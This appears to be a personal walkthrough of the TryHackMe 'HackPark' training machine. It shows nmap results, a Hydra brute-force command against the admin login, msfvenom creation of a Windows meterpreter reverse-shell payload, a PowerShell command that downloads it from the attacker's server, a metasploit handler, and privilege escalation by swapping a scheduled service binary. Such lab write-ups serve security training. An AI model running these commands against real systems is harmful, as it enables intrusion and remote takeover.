# HackPark - Tryhackme machine

## Enumeration

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 13:30 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:30
Completed Parallel DNS resolution of 1 host. at 13:30, 0.00s elapsed
Initiating Connect Scan at 13:30
Scanning 10.10.153.45 [1 port]
Discovered open port 80/tcp on 10.10.153.45
Completed Connect Scan at 13:30, 0.17s elapsed (1 total ports)
Initiating Service scan at 13:30
Scanning 1 service on 10.10.153.45
Completed Service scan at 13:30, 6.43s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.153.45.
Initiating NSE at 13:30
Completed NSE at 13:30, 3.28s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.72s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Nmap scan report for 10.10.153.45
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Initiating NSE at 13:30
Completed NSE at 13:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

- Used Hydra to brute force login into the /admin panel

```bash
hydra -l admin -P rockyou.txt http://<IP>/ http-post-form "login Request PAYLOAD with ^USER^ and ^PASS^"
```

- Uploading an exploit for BlogEngine, that I found from exploit-db
- Followed the instructions and gained a netcat shell

## Upgrading to meterpreter shell

- Generating a msfvenom payload

    ```bash
    msfvenom -p windows/meterepreter/reverse_tcp -f exe LHOST=<IP> LPORT=1234 > shell.exe 
    ```

- Then I downloaded this payload to the netcat shell

    Started a server on port 8000

    ```bash
    python3 -m http.server 8000
    ```

    Downloaded the file with powershell 

    ```bash
    powershell -c "Invoke-WebRequest -Uri 'http://<IP>:8000/shell.exe' -Outfile 'shell.exe'
    ```

    NOTE : 

    1. always start the server in the folder containing the exploit 
    2. mention the name of the file in the uri along with the ip address 
    3. use ' ' 
- Used multi/handler from metasploit to access the meterpreter shell

```bash
msfconsole 
use multi/handler 
set payload windows/meterpreter/reverse_tcp 
set lhost <IP>
set lport 1234
```

- Then run the downloaded exploit on netcat shell, .\shell.exe

## Privilege Escalation

- Find a running service that can be exploited using winPEAS
- Found a service Message.exe which runs every 30 seconds
- So I used previously generated shell.exe and renamed it to Message.exe and waited for it to run â†’ root shell